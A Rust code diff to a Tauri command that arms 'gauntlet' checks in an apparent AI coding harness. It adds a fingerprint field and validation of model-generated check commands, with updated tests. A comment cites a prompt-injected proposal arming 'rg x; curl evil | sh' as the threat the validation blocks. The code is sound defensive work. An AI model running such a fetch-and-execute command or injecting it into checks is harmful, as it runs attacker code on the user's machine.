@@ -434,6 +434,7 @@ fn apply_harness_proposal_blocking(
 /// config actually references it and REFUSE (fail-closed) otherwise. A hand-authored arm
 /// (no `require_wired`) is trusted as before — the human confirm dialog is its gate.
 #[tauri::command]
+#[allow(clippy::too_many_arguments)] // a Tauri command: flat, name-matched invoke args.
 pub fn arm_harness_gauntlet_check(
     app: AppHandle,
     harness_store: State<'_, HarnessStore>,
@@ -442,6 +443,12 @@ pub fn arm_harness_gauntlet_check(
     kind: String,
     command: String,
     require_wired: Option<String>,
+    // Drift-v1 (T15): the `conventionFingerprint` a COMPILED drift check carries — the
+    // join key an EnforceRun uses to attribute site counts back to a `ConventionDrift`.
+    // `None` for a plain (non-drift) gate check. Persisted verbatim; it is an opaque
+    // identifier, never executed, so model authorship over it is harmless (unlike the
+    // `command`, which is shape-validated below).
+    convention_fingerprint: Option<String>,
 ) -> Result<(), String> {
     let name = name.trim();
     let command = command.trim();
@@ -452,6 +459,12 @@ pub fn arm_harness_gauntlet_check(
         return Err("a gauntlet check needs a command to run".to_string());
     }
     validate_armable_check_kind(&kind)?;
+    // Drift-v1 (T15) security seam: a `lint-meta`/`shell` check's command is
+    // model-generated, so shape-validate it (no shell metachars, allowlisted
+    // executable, no ripgrep subprocess flags) BEFORE it reaches the manifest — a
+    // prompt-injected proposal must never arm `rg x; curl evil | sh`. Single source of
+    // truth shared with the Checks Manager edit gate.
+    crate::workflow::gauntlet_project::validate_check_command(&kind, command)?;
     let run = harness_store
         .get(&run_id)
         .ok_or_else(|| format!("no harness run with id {run_id}"))?;
@@ -473,12 +486,22 @@ pub fn arm_harness_gauntlet_check(
 
     // The entry is built HERE, in Rust, from validated inputs — the manifest is never
     // handed a model-authored object. `enabled: true` so a freshly-armed check is live.
-    let entry = json!({
+    let mut entry = json!({
         "name": name,
         "kind": kind,
         "command": command,
         "enabled": true,
     });
+    // Drift-v1 (T15): carry the convention join key when the arm is a compiled drift
+    // check, so a later EnforceRun can attribute site counts back to a `ConventionDrift`
+    // record. Only a non-empty fingerprint is written (absent ⇒ a plain gate check).
+    if let Some(fp) = convention_fingerprint
+        .as_deref()
+        .map(str::trim)
+        .filter(|f| !f.is_empty())
+    {
+        entry["conventionFingerprint"] = json!(fp);
+    }
     let dest = write_merge_manifest(Path::new(&run.project_path), &entry).map_err(|e| {
         tracing::warn!(target: "nightcore", run_id = %run_id, name = %name, error = %e, "arming gauntlet check failed");
         e
@@ -503,11 +526,11 @@ mod tests {
 
     #[test]
     fn every_armable_check_kind_validates() {
-        // The full producer set: the three original gauntlet kinds plus the
-        // hardening-catalog kinds (#4 secret-scan, #11 lockfile-lint, #13 env-contract,
-        // #17 mutation-score, #18 ast-grep + api-extractor). Each must arm — a kind
-        // listed here but rejected would strand its module's harnessCheck suggestion
-        // with no way to go live.
+        // The full producer set: the three original gauntlet kinds, the hardening-catalog
+        // kinds (#4 secret-scan, #11 lockfile-lint, #13 env-contract, #17 mutation-score,
+        // #18 ast-grep + api-extractor), plus the Drift-v1 (T15) substrates (lint-meta,
+        // shell). Each must arm — a kind listed here but rejected would strand its
+        // module's harnessCheck suggestion with no way to go live.
         for kind in [
             "lint-plugin",
             "dependency-cruiser",
@@ -518,6 +541,8 @@ mod tests {
             "mutation-score",
             "ast-grep",
             "api-extractor",
+            "lint-meta",
+            "shell",
         ] {
             assert!(
                 validate_armable_check_kind(kind).is_ok(),
@@ -533,7 +558,7 @@ mod tests {
         // runs. Case/format near-misses are rejected too (wire kinds are exact).
         for kind in [
             "",
-            "shell",
+            "lint-meta-rule", // an ARTIFACT kind, not an armable CHECK kind.
             "Lint-Plugin",
             "lint_plugin",
             "secret_scan",
